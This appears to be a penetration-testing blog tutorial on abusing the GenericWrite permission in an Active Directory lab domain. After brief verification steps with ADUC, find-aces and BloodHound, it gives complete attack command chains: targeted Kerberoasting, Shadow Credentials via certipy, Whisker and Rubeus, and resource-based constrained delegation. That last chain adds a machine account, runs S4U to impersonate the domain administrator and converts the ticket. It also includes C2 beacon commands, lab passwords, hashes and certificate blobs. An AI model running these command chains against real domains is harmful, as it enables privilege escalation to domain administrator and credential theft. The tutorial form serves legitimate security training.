---
title: ⚔️DACL - GenericWrite
date: 2025-10-28 01:06:00 +/-TTTT
categories: [DACL]
tags: [GenericWrite]     # TAG names should always be lowercase
image : /assets/images/genericwritebackground.png
---
> Author : lineeralgebra
{:.prompt-tip}

# **GenericWrite on User → User**

**GenericWrite** is powerfull but not like **GenericAll** we will do same attacks instead of change password cause we dont have Full privileges.

## **GenericWrite on User → User happening why?**

Before start lets learn why is happening? where to check and verify?

We have to open `dsa.msc` → ADUC first and make sure its enabled.

1. Go to the **Security** tab.
    - If you don’t see it: in ADUC, click **View → Advanced Features**, then open Properties again.
2. Click **Advanced**.
3. We can go our target directly and `right click` and select `Properties`  After u select victim user and check `Permissions`
    
![alt text](../assets/images/dacl25.png)
    

here is how works tho

```bash
dsacls "CN=harun,CN=Users,DC=lab,DC=local" /G LAB\behzat:GW
```

## **GenericWrite on User → User Verify**

It was really really boring to check with PowerView before so lets check with great tool!

### **GenericWrite on User → User Verify w find-aces**

https://github.com/L1nvx/find-aces

Really great tooolll!!! love it.

**Requirements**

```bash
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama
```

and usage is easy too!!

```bash
python3 main.py --auth "ldap+ntlm-password://LAB\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\irem@dc.lab.local"
```

for our lab

```bash
python3 main.py --auth "ldap+ntlm-password://lab.local\\behzat:babygirl@VALENOR-DC01.lab.local"

Type 'help' to see available commands.
$ find_object_aces behzat

```

![alt text](../assets/images/dacl26.png)

### **GenericWrite on User → User Verify w Bloodhound**

And off course easiest and common way is bloodhound

![alt text](../assets/images/dacl27.png)

## **GenericWrite on User → User Attack**

As we said with GenericWrite has `Write` permission and we can do **Kerberoasting and Shadow Credentials attack** 

### **GenericWrite on User → User Attack Kerberoasting**

We can use 2 methods here and its shows at Bloodhound

![alt text](../assets/images/dacl28.png)

https://github.com/ShutdownRepo/targetedKerberoast

```bash
python3 targetedKerberoast.py -v -d 'lab.local' -u 'behzat' -p 'babygirl'
```

![alt text](../assets/images/dacl29.png)

now we can try to crack this hashes but its not mean we can always crack so i can reccommend Shadow Credentials Attack

### **GenericWrite on User → User Attack  Shadow Credentials attack**

Lets do with [certipy](https://github.com/ly4k/Certipy) first cause its easy

https://github.com/ly4k/Certipy

```bash
certipy-ad shadow auto -username behzat@lab.local -password babygirl -account harun -dc-ip 192.168.1.10
```

![alt text](../assets/images/dacl30.png)

or with [Whisker.exe](https://github.com/eladshamir/Whisker)!!! u can find here tho

https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Whisker.exe

for add on target

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Whisker.exe add /target:harun /domain:lab.local /dc:VALENOR-DC01.lab.local
```

![alt text](../assets/images/dacl31.png)

it will give us command directly so we will read NTLM hash directly!!!

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Rubeus.exe asktgt /user:harun /certificate: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 /password:"YjD2L6mL18rXjM4r" /domain:lab.local /dc:VALENOR-DC01.lab.local /getcredentials /show
```

![alt text](../assets/images/dacl32.png)

# **GenericWrite on User → Computer**

Before start lets learn why is happening? where to check and verify?

We have to open `dsa.msc` → ADUC first and make sure its enabled.

1. Go to the **Security** tab.
    - If you don’t see it: in ADUC, click **View → Advanced Features**, then open Properties again.
2. Click **Advanced**.,Now we can go our target to verify
3. We can go our target directly and `right click` and select `Properties`  After u select victim user and check `Permissions` 
    
![alt text](../assets/images/dacl33.png)


### **GenericWrite on User → Computer Verify w find-aces**

with Powerview it was really **hell** so i will use this great tool directly at this part!!!

https://github.com/L1nvx/find-aces

```bash
Requirements
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama

and usage is easy too!!
python3 main.py --auth "ldap+ntlm-password://LAB\\\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\\\irem@dc.lab.local"

for our lab
(.venv) ➜  find-aces git:(main) ✗ python3 main.py --auth "ldap+ntlm-password://lab.local\\\\irem:princess@VALENOR-DC01.lab.local"

Type 'help' to see available commands.
$ 

and just give
find_object_aces <username> - Search for ACEs for a specific user                                                                                            
```

![alt text](../assets/images/dacl34.png)

### **GenericWrite on User → Computer Verify w Bloodhound**

We can also verify really fast with bloodhound off course!!

![alt text](../assets/images/dacl35.png)

## **GenericWrite on User → Computer Attack**

As we said with GenericWrite we have `read` and we can do RBCD directly and Shadow Credentials attack (w certipy)

### **GenericWrite on User → Computer Attack** Shadow Credentials attack

We checked this before and it was really easy with [`certipy`](https://github.com/ly4k/Certipy)

```bash
certipy-ad shadow auto -username behzat@lab.local -password babygirl -account TROY$ -dc-ip 192.168.1.10
```

![alt text](../assets/images/dacl36.png)

or with [Whisker.exe](https://github.com/eladshamir/Whisker)!!! u can find here tho

https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Whisker.exe

for add on target

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Whisker.exe add /target:TROY$ /domain:lab.local /dc:VALENOR-DC01.lab.local
```

![alt text](../assets/images/dacl37.png)

and run this for grab NTLM hash of `TROY$`

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Rubeus.exe asktgt /user:TROY$ /certificate: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 /password:"E2Ze2zQwCRMSPBwJ" /domain:lab.local /dc:VALENOR-DC01.lab.local /getcredentials /show
```

![alt text](../assets/images/dacl38.png)

### **GenericWrite on User → Computer Attack  Resource-Based Constrained Delegation**

Yes!! thats the another great way and common one!! we can do **RBCD** directly at target computer.

U can find commands here thats also great

![alt text](../assets/images/dacl39.png)

and just use them

```bash
addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM2$' -computer-pass 'Summer2019!' -dc-host VALENOR-DC01.lab.local -domain-netbios lab.local 'lab.local/behzat:babygirl'

rbcd.py -delegate-from 'ATTACKERSYSTEM2$' -delegate-to 'TROY$' -action 'write' 'lab.local/behzat:babygirl'

getST.py -spn 'cifs/TROY.lab.local' -impersonate 'administrator' 'lab.local/attackersystem2$:Summer2019!'

```

![alt text](../assets/images/dacl40.png)

Lets do same thing on windows (C2)!!!

1. Lets add computer first!!

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/StandIn.exe --computer Ankara2 --make --Domain lab.local
```

![alt text](../assets/images/dacl41.png)
1. set RBCD

```bash
powershell-import /home/elliot/tools/PowerView.ps1

powerpick Set-ADComputer TROY -PrincipalsAllowedToDelegateToAccount Ankara2$

powerpick Get-ADComputer TROY -Properties PrincipalsAllowedToDelegateToAccount
```

![alt text](../assets/images/dacl42.png)

1. Lets get rc4 hash of attacker computer

```bash
execute-assembly /home/elliot/tools/Rubeus.exe hash /password:65g9Fi0vGYxyvL1 /user:Ankara2$ /domain:VALENOR-DC01.lab.local
[09/04 16:59:23] [*] Tasked beacon to run .NET program: Rubeus.exe hash /password:65g9Fi0vGYxyvL1 /user:Ankara2$ /domain:VALENOR-DC01.lab.local
[09/04 16:59:23] [+] host called home, sent: 556372 bytes
[09/04 16:59:24] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Calculate Password Hash(es)

[*] Input password             : 65g9Fi0vGYxyvL1
[*] Input username             : Ankara2$
[*] Input domain               : VALENOR-DC01.lab.local
[*] Salt                       : VALENOR-DC01.LAB.LOCALhostankara2.valenor-dc01.lab.local
[*]       rc4_hmac             : 109DE6F52B67E604F70F5042C0775872
[*]       aes128_cts_hmac_sha1 : EA2F760B405E99128832B917220EDEE7
[*]       aes256_cts_hmac_sha1 : F301F69459CC5EB206043CAB1DCE3FFB94087797867B3501E6834EA300F1424C
[*]       des_cbc_md5          : 0B3E29C76297738
```

1. Now lets craete ticket for Administrator.

Command to execute:

```bash
execute-assembly /home/elliot/tools/Rubeus.exe s4u /user:Ankara2$ /password:65g9Fi0vGYxyvL1 /domain:lab.local /impersonateuser:administrator /rc4:109DE6F52B67E604F70F5042C0775872 /msdsspn:cifs/TROY.lab.local /nowrap
```

![alt text](../assets/images/dacl43.png)

lets convert with

```bash
echo -n "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" | base64 -d > ticket.kirbi

ticketConverter.py ticket.kirbi ticket.cache
```

![alt text](../assets/images/dacl44.png)